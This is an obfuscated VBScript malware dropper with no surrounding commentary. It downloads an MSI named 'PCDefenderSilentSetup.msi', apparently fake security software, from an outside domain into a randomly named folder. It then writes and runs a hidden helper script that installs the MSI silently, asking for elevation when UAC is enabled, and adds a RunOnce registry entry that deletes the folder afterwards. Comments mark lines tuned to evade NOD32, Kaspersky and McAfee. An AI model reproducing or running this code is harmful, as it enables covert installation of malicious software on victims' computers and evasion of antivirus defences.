Dim yy5LrTYo62ly49NXdw, ki1X7e4
bBr382pg19fckybz296FA = "" & nCNP76xLMkf99D374w & "\" & dDP1sg0FZA4t4DRbp6DW ' <- NOD32
Set yy5LrTYo62ly49NXdw = CreateObject("Scripting.FileSystemObject")
Set ki1X7e4 = yy5LrTYo62ly49NXdw.CreateFolder(bBr382pg19fckybz296FA)

YDL832U = "http://mykaksosat.info/PCDefenderSilentSetup.msi"
ZUx7xioHiY1eZ45zVe = "" & dDP1sg0FZA4t4DRbp6DW & ".msi"
ci913FMNHm6mjI5fj YDL832U, bBr382pg19fckybz296FA, ZUx7xioHiY1eZ45zVe ' <- KIS

rs1J5p = "Dim suUVk93u4lmFPEt6srJr83, L9w8n9C08ABFgTHA9W035Z, k4RPSUjlJWSlJ3x3Y4gSylftL, Zp7lSaRu5EW679RBke4Ax, ZYQ6Kl9imt3J8I6l8Js, wf30KPM67fb9IY6t3q0Zjf424" & vbCr & vbLf & _
    "Set suUVk93u4lmFPEt6srJr83 = CreateObject(""WScript.Shell"")" & vbCr & vbLf & _
    "L9w8n9C08ABFgTHA9W035Z = suUVk93u4lmFPEt6srJr83.ExpandEnvironmentStrings(""%OS%"")" & vbCr & vbLf & _
    "If L9w8n9C08ABFgTHA9W035Z = ""Windows_NT"" Then" & vbCr & vbLf & _
    "   k4RPSUjlJWSlJ3x3Y4gSylftL = ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\""" & vbCr & vbLf & _
    "   Zp7lSaRu5EW679RBke4Ax = suUVk93u4lmFPEt6srJr83.regread(k4RPSUjlJWSlJ3x3Y4gSylftL & ""CurrentVersion"")" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
    "  k4RPSUjlJWSlJ3x3Y4gSylftL = ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\""" & vbCr & vbLf & _
    "  Zp7lSaRu5EW679RBke4Ax = suUVk93u4lmFPEt6srJr83.regread(k4RPSUjlJWSlJ3x3Y4gSylftL & ""VersionNumber"")" & vbCr & vbLf & _
    "End if" & vbCr & vbLf & _
    "Zp7lSaRu5EW679RBke4Ax = Mid(Zp7lSaRu5EW679RBke4Ax,1,1)" & vbCr & vbLf & _
    "If (Zp7lSaRu5EW679RBke4Ax = 6) Then" & vbCr & vbLf & _
    "   ZYQ6Kl9imt3J8I6l8Js = ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\""" & vbCr & vbLf & _
    "   wf30KPM67fb9IY6t3q0Zjf424 = suUVk93u4lmFPEt6srJr83.regread(ZYQ6Kl9imt3J8I6l8Js & ""EnableLUA"")" & vbCr & vbLf & _
    "End If" & vbCr & vbLf & _
    "Set suUVk93u4lmFPEt6srJr83 = Nothing" & vbCr & vbLf & _
    "Set suUVk93u4lmFPEt6srJr83 = CreateObject(""Shell.Application"")" & vbCr & vbLf & _
	"If ((Zp7lSaRu5EW679RBke4Ax = 6) AND (wf30KPM67fb9IY6t3q0Zjf424 = 1)) Then" & vbCr & vbLf & _
	"   suUVk93u4lmFPEt6srJr83.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&ZUx7xioHiY1eZ45zVe&""" & Chr(34) & "" /quiet"", """", ""runas"", 1" & vbCr & vbLf & _
    "   Set suUVk93u4lmFPEt6srJr83 = Nothing" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
	"   suUVk93u4lmFPEt6srJr83.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&ZUx7xioHiY1eZ45zVe&""" & Chr(34) & "" /quiet"", """", ""open"", 1" & vbCr & vbLf & _
    "   Set suUVk93u4lmFPEt6srJr83 = Nothing" & vbCr & vbLf & _
    "End If"
WEU9SrbJTOUK3y = bBr382pg19fckybz296FA & "\" & dDP1sg0FZA4t4DRbp6DW & ".vbs"
Set CK16V5hk1s535V6h0TwA0wfj = yy5LrTYo62ly49NXdw.OpenTextFile(WEU9SrbJTOUK3y, 8, True)
CK16V5hk1s535V6h0TwA0wfj.WriteLine(rs1J5p)
CK16V5hk1s535V6h0TwA0wfj.Close

dim o9B1va
set o9B1va = CreateObject("Shell.Application")
o9B1va.ShellExecute "wscript", """" & WEU9SrbJTOUK3y & """", "", "open", 0 ' <- McAfee
set o9B1va = nothing

y0Q6F bBr382pg19fckybz296FA


Function ci913FMNHm6mjI5fj(u57k3x2rtPeEC9vH1lt, mFp275QSUt5dOD35lZ, v53qQw1LJ183kXh05N0s6)
   Dim dAVg20HF1Lz39autVKnZ1d, TyI9W105arLLY
   
   u57k3x2rtPeEC9vH1lt = Replace(u57k3x2rtPeEC9vH1lt,"\","/")

   'If len(v53qQw1LJ183kXh05N0s6) = 0 Then ' <- KIS
   '   Exit Function 
   'End If

   Set dAVg20HF1Lz39autVKnZ1d = CREATEOBJECT("Microsoft.XMLHTTP") 
   dAVg20HF1Lz39autVKnZ1d.open "GET", u57k3x2rtPeEC9vH1lt, "False" 

   dAVg20HF1Lz39autVKnZ1d.send 
   If dAVg20HF1Lz39autVKnZ1d.statustext = "OK" Then 
      Set TyI9W105arLLY = CreateObject("ADODB.Stream") 
      TyI9W105arLLY.type = 1 
      TyI9W105arLLY.Open 
      TyI9W105arLLY.Write dAVg20HF1Lz39autVKnZ1d.responseBody 

      if len(mFp275QSUt5dOD35lZ) > 0 Then v53qQw1LJ183kXh05N0s6 = mFp275QSUt5dOD35lZ & "\" & v53qQw1LJ183kXh05N0s6 
      TyI9W105arLLY.SaveToFile v53qQw1LJ183kXh05N0s6, 2 
      TyI9W105arLLY.Close 
      Set TyI9W105arLLY = Nothing 
      ci913FMNHm6mjI5fj = 1
   End if 
   Set dAVg20HF1Lz39autVKnZ1d = Nothing
End Function


Function dDP1sg0FZA4t4DRbp6DW
	gRZi1T6YV20rsKm13x5tt = 14
	dQ31t873Gy2bahSB = 7

	Randomize  
	k31z27wL98732cuV1KV3 = Int(((gRZi1T6YV20rsKm13x5tt - dQ31t873Gy2bahSB + 1) * Rnd) _
	    + gRZi1T6YV20rsKm13x5tt)  

	gRZi1T6YV20rsKm13x5tt = 90
	dQ31t873Gy2bahSB = 65
	
	For i = 1 to k31z27wL98732cuV1KV3
	    Randomize
	    x678TZzu0X8 = Int(((gRZi1T6YV20rsKm13x5tt - dQ31t873Gy2bahSB + 1) * Rnd) _
	        + dQ31t873Gy2bahSB)  
	    XTuSLd493lpLOO6hwQ1 = XTuSLd493lpLOO6hwQ1 & Chr(x678TZzu0X8)
	Next
	
	dDP1sg0FZA4t4DRbp6DW = XTuSLd493lpLOO6hwQ1
End Function


Function nCNP76xLMkf99D374w
	Set n25k1x27GxRO2kfa3i7 = Wscript.CreateObject("Wscript.Shell")
	nCNP76xLMkf99D374w = n25k1x27GxRO2kfa3i7.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")
End Function


Function y0Q6F(cZvUoHNhHwY8pz)
	Set YcI61iZCI9211 = Wscript.CreateObject("Wscript.Shell")
	YcI61iZCI9211.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\delpcdefmsi", "cmd /c rmdir /s /q """ & cZvUoHNhHwY8pz & """", "REG_SZ"
End Function
